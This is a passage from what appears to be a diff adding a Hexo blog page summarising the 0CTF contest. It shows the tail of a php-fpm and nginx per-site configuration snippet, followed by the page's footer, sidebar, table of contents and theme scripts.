class="label">$2</span></span><br><span class="line"><span class="keyword">if</span> [ -<span class="keyword">n</span> <span class="string">"$vhost"</span> ];then</span><br><span class="line">        vhost=-<span class="label">$vhost</span></span><br><span class="line">fi</span><br><span class="line">php_fpm_CONF=<span class="label">$&#123;prefix&#125;</span>/etc/php-fpm<span class="label">$vhost</span>.<span class="keyword">conf</span></span><br><span class="line">php_fpm_PID=<span class="label">$&#123;prefix&#125;</span>/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm<span class="label">$vhost</span>.pid</span><br><span class="line"></span><br><span class="line">restart)</span><br><span class="line">                <span class="label">$0</span> stop <span class="label">$2</span></span><br><span class="line">                <span class="label">$0</span> start <span class="label">$2</span></span><br><span class="line"></span><br><span class="line"># 修改文件夹权限</span><br><span class="line">$ chown ctf5:www -R /home/wwwroot/ctf5</span><br><span class="line"># 最后记得重启</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/nginx restart</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/php-fpm start ctf5</span><br></pre></td></tr></table></figure></span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag">#CTF</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/03/15/0x13/" rel="prev">This is AliCTF?</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/03/07/0x11/" rel="next">unholy Writeup</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+            </div>
+
+            
+
+            
+              <div class="comments" id="comments">
+                
+                  <div class="ds-thread" data-thread-key="2016/03/14/0x12/"
+                       data-title="0CTF总结" data-url="http://lazysheep.cc/2016/03/14/0x12/">
+                  </div>
+                
+              </div>
+            
+        </div>
+
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar" style="overflow:scroll">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/img/default_avatar.jpg" alt="Hcamael" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Hcamael</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="icon-archives" style="color:white"></span><span class="site-state-item-count">16</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+            <span class="icon-categories" style="color:white"></span>
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+            <span class="icon-tags" style="color:white"></span>
+              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate" style="text-align:center;" >
+              <i class="menu-item-icon icon-feed" ></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-github" ></span>
+                <a href="https://github.com/Hcamael" target="_blank">github</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-twitter" ></span>
+                <a href="https://twitter.com/2_wat1r" target="_blank">twitter</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-weibo" ></span>
+                <a href="http://weibo.com/hcamael" target="_blank">weibo</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-zhihu" ></span>
+                <a href="http://www.zhihu.com/people/hcamael" target="_blank">zhihu</a>
+              </span>
+              <br>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://hduisa.cn" target="_blank">HDUISA</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://lightless.me" target="_blank">lightless</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://homeway.me" target="_blank">夏日小草</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://www.edwardl.xyz" target="_blank">Edward_L</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://evilddog.space" target="_blank">evilddog</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://aklis.info" target="_blank">Aklis</a>
+              </span>
+              <br>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#rand_2"><span class="nav-number">1.</span> <span class="nav-text">rand_2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#piapiapia"><span class="nav-number">2.</span> <span class="nav-text">piapiapia</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="copyright" >
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hcamael</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT
+  </a>
+</div>
+
+
+
+        </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+</div>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"hcamael"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.unstable.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+  	<script src="/js/ua-parser.min.js"></script>
+  	<script src="/js/hook-duoshuo.js"></script>
+  
+
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.4"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.4"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.4" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.4" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+<script type="text/javascript">
+    $(document).ready(function () {
+        if (CONFIG.sidebar === 'always') {
+            displaySidebar();
+        }
+    });
+</script>
+
+
+
+
+
+
+
+
+<!-- lazyload -->
+<script type="text/javascript" src="/js/lazyload.js"></script>
+<script type="text/javascript">
+    jQuery(function () {
+        jQuery("#posts img").lazyload({
+            placeholder: "/img/loading.gif",
+            effect: "fadeIn"
+        });
+    });
+</script>
+</body>
+</html>
